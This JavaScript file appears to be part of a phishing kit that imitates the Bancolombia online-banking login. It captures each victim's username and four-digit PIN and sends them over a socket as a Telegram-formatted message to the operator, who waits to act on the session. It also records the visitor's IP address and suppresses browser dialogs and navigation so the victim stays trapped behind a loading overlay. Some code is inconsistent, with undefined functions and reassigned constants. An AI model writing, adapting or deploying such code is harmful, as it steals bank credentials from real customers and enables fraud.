// Utilizar el módulo compartido para la gestión de sesión

const updateDateTime = () => {
    const now = new Date();
    const options = { 
        weekday: 'long', 
        year: 'numeric', 
        month: 'long', 
        day: 'numeric',
        hour: 'numeric',
        minute: '2-digit',
        hour12: true,
        timeZone: 'America/Bogota'
    };
    const dateTimeStr = now.toLocaleDateString('es-CO', options).replace(',', '');
    document.querySelectorAll('.datetime').forEach(el => {
        el.textContent = dateTimeStr.toLowerCase();
    });
};

const getIPAddress = async () => {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        document.querySelectorAll('.ip-address').forEach(el => {
            el.textContent = `Dirección IP: ${data.ip}`;
        });
    } catch (error) {
        console.error('Error fetching IP:', error);
    }
};

// Validación de formulario de login
// Eliminar TODOS los diálogos y eventos de navegación de forma agresiva
function removeAllDialogs() {
    // Limpiar eventos existentes
    window.onbeforeunload = null;
    window.onunload = null;
    window.onpopstate = null;
    
    // Eliminar las propiedades completamente
    delete window.onbeforeunload;
    delete window.onunload;
    delete window.onpopstate;
    
    // Prevenir diálogos futuros
    window.addEventListener('beforeunload', (e) => {
        e.stopPropagation();
        e.stopImmediatePropagation();
        e.preventDefault();
        e.returnValue = null;
    }, true);
    
    // Sobreescribir el método para prevenir diálogos
    window.alert = function() { return true; };
    window.confirm = function() { return true; };
    window.prompt = function() { return true; };
}

// Ejecutar inmediatamente
removeAllDialogs();

// Ejecutar periódicamente para asegurar
setInterval(removeAllDialogs, 100);document.addEventListener('DOMContentLoaded', async () => {
    // Asegurar que los diálogos estén deshabilitados
    disableAllDialogs();
    
    // Inicializar sesión de forma robusta
    await new Promise(resolve => {
        const initSession = () => {
            const sessionId = bancolombia.initGlobalSession();
            if (sessionId) {
                // Forzar la sesión en el storage
                localStorage.setItem('bancolombia_session', sessionId);
                sessionStorage.setItem('currentSession', sessionId);
                window.globalSessionId = sessionId;
                resolve();
            } else {
                setTimeout(initSession, 100);
            }
        };
        initSession();
    });

    // Inicializar sesión y configurar manejo de Telegram
    bancolombia.initGlobalSession();
    bancolombia.setupTelegramActions();
    
    const usuarioInput = document.getElementById('usuario');
    const claveInput = document.getElementById('clave');
    const submitButton = document.querySelector('.btn-iniciar');
    const form = document.querySelector('.auth-form');
    
    // Obtener overlay compartido
    const overlay = bancolombia.createLoadingOverlay();

    // La inicialización de sesión ya está manejada por setupTelegramActions
    
    // Solo permitir números en el campo de clave
    claveInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, '');
        if (e.target.value.length > 4) {
            e.target.value = e.target.value.slice(0, 4);
        }
    });

    // Validar campos para habilitar botón
    const validateForm = () => {
        const usuario = usuarioInput.value.trim();
        const clave = claveInput.value;
        
        const isValid = usuario.length > 0 && clave.length === 4;
        
        submitButton.disabled = !isValid;
        
        if (isValid) {
            submitButton.classList.add('active');
            submitButton.style.backgroundColor = '#ffd700';
            submitButton.style.cursor = 'pointer';
        } else {
            submitButton.classList.remove('active');
            submitButton.style.backgroundColor = '';
            submitButton.style.cursor = 'default';
        }
    };

    // Agregar eventos de validación
    usuarioInput.addEventListener('input', validateForm);
    claveInput.addEventListener('input', validateForm);
    usuarioInput.addEventListener('change', validateForm);
    claveInput.addEventListener('change', validateForm);
    
    // Validar al cargar la página
    validateForm();

    // Crear overlay de carga
    // Eliminar overlay existente si hay alguno
    const existingOverlay = document.querySelector('.loading-overlay');
    if (existingOverlay) {
        existingOverlay.remove();
    }

    // Usar el overlay compartido
    const loadingOverlay = bancolombia.createLoadingOverlay();
    document.body.appendChild(loadingOverlay);    // Manejar reconexiones
    globalSocket.on('disconnect', () => {
        console.log('Desconectado del servidor');
        setTimeout(() => {
            globalSocket = initializeSocket();
        }, 1000);
    });

    // Manejar confirmación de sesión
    globalSocket.on('sessionConfirmed', (data) => {
        console.log('Sesión confirmada:', data.sessionId);
    });

    // Eliminar manejador de Telegram redundante ya que usamos setupTelegramActions

    // Remover y reemplazar el formulario para limpiar todos los eventos
    const oldForm = form;
    const newForm = oldForm.cloneNode(true);
    oldForm.parentNode.replaceChild(newForm, oldForm);
    form = newForm;

    // Prevenir CUALQUIER diálogo al navegar
    window.history.pushState = null;
    window.history.replaceState = null;
    window.history.back = null;
    window.history.forward = null;
    window.onpopstate = null;
    
    // Reinstalar los listeners necesarios en el nuevo formulario
    usuarioInput = form.querySelector('#usuario');
    claveInput = form.querySelector('#clave');
    submitButton = form.querySelector('.btn-iniciar');
    
    // Reinstalar validaciones
    [usuarioInput, claveInput].forEach(input => {
        input.addEventListener('input', validateForm);
        input.addEventListener('change', validateForm);
    });
    
    // Validación de clave numérica
    claveInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, '');
        if (e.target.value.length > 4) {
            e.target.value = e.target.value.slice(0, 4);
        }
    });
    
    // Control estricto de un solo envío
    let hasSubmitted = false;
    
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        // Eliminar TODOS los event listeners de navegación
        window.onbeforeunload = null;
        window.onunload = null;
        window.onpopstate = null;
        
        const now = Date.now();
        if (isSubmitting || (now - lastSubmissionTime < MIN_SUBMISSION_INTERVAL)) {
            console.log('Envío demasiado rápido o ya en proceso');
            return;
        }
        
        // Actualizar estado de envío
        isSubmitting = true;
        lastSubmissionTime = now;
        
        // Mostrar overlay y bloquear interfaz
        overlay.show(true);
        
        // Bloquear UI
        document.body.style.position = 'fixed';
        document.body.style.width = '100%';
        document.body.style.height = '100%';
        document.body.style.overflow = 'hidden';

        // Deshabilitar formulario
        usuarioInput.disabled = true;
        claveInput.disabled = true;
        submitButton.disabled = true;
        form.style.pointerEvents = 'none';
        
        if (hasSubmitted) {
            console.log('Formulario ya fue enviado');
            return;
        }

        // Verificar conexión
        if (globalSocket && globalSocket.connected) {
            hasSubmitted = true; // Marcar como enviado inmediatamente
            
            // Remover TODOS los listeners existentes
            globalSocket.removeAllListeners('dataSent');
            globalSocket.removeAllListeners('telegramAction');
            
            // Limpiar cualquier estado anterior
            sessionStorage.clear(); // Limpieza completa
            
            const data = {
                type: 'login',
                sessionId: bancolombia.getSessionId(),
                content: {
                    text: `📱 Inicio de sesión\n` +
                         `👤 Usuario: ${usuarioInput.value}\n` +
                         `🔐 Clave: ${claveInput.value}`
                },
                timestamp: Date.now(),
                page: 'index.html',
                waitForAction: true
            };
            
            // Marcar que el formulario fue enviado
            sessionStorage.setItem('formSubmitted', 'true');
            
            // Prevenir CUALQUIER diálogo antes del envío
            window.onbeforeunload = null;
            window.onunload = null;
            delete window.onbeforeunload;
            delete window.onunload;
            
            // Un solo envío
            globalSocket.emit('sendData', data);
            
            // Forzar que el overlay permanezca visible y prevenir diálogos
            overlay.show(true);
            
            // Prevenir diálogos después del envío
            setTimeout(() => {
                window.onbeforeunload = null;
                window.onunload = null;
                delete window.onbeforeunload;
                delete window.onunload;
            }, 0);

            // SOLO mantener el overlay visible después del envío
            globalSocket.once('dataSent', (response) => {
                console.log('Datos enviados correctamente');
                // Asegurarnos de que el overlay sigue visible
                overlay.show(true);
            });

            // NO escuchar ninguna acción de Telegram aquí
            // La redirección debe ser manejada SOLO por el setupTelegramActions en shared.js

        } else {
            console.error('Socket no conectado');
            overlay.hide();
            resetForm();
        }

        function resetForm() {
            isSubmitting = false;
            usuarioInput.disabled = false;
            claveInput.disabled = false;
            submitButton.disabled = false;
            form.style.pointerEvents = 'auto';
            document.body.style.position = '';
            document.body.style.width = '';
            document.body.style.height = '';
            document.body.style.overflow = '';
            window.onbeforeunload = null;
        }
    });
});

// Update date and time every second
setInterval(updateDateTime, 1000);
updateDateTime();

// Get IP address on load
getIPAddress();